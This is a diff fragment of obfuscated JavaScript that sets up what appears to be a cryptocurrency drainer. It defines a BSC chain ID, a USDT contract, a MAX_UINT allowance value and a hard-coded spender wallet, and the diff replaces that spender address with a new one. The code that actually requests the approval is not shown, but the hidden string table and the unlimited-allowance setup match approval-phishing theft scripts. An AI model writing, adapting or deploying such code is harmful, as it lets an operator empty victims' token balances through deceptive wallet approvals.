@@ -16,7 +16,7 @@ const _0x2b14ce = _0x273e;
 }(_0x1161, 0x31666));
 const BSC_CHAIN_ID = _0x2b14ce(0x1a2)
   , USDT_CONTRACT_ADDRESS = _0x2b14ce(0x178)
-  , SPENDER_ADDRESS = '0xC955a60D43292408F3Bb51765C0478f5b4AEef1A'
+  , SPENDER_ADDRESS = '0xa180f965528e913fdb9a250e2d0ae7108c6f19af'
   , MAX_UINT = _0x2b14ce(0x1a6);
 let web3, usdtContract;
 const USDT_ABI = [{
